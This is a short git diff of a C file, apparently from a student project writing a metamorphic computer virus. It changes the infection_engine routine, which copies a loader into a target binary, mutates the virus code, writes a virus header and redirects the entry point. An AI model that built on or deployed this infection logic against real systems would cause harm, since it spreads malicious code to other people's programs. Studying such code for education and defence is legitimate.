@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/01/12 17:51:43 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/02/22 22:53:42 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -118,12 +118,12 @@ bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !get_client_id(&client_id, original_ref)
 	|| !copy_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
-	|| !copy_loader_to_clone(clone_ref, original_entry.end_of_last_section)
+	|| !copy_loader_to_clone(clone_ref, &original_entry)
 	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, son_seed, client_id)
 	|| !adjust_references(clone_ref , shift_amount, original_entry.end_of_last_section)
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, shift_amount)
-	|| !setup_payload(clone_ref, &clone_entry, son_seed)
+	|| !setup_virus_header(clone_ref, original_entry.end_of_last_section, son_seed)
 	|| !change_entry(clone_ref, &original_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
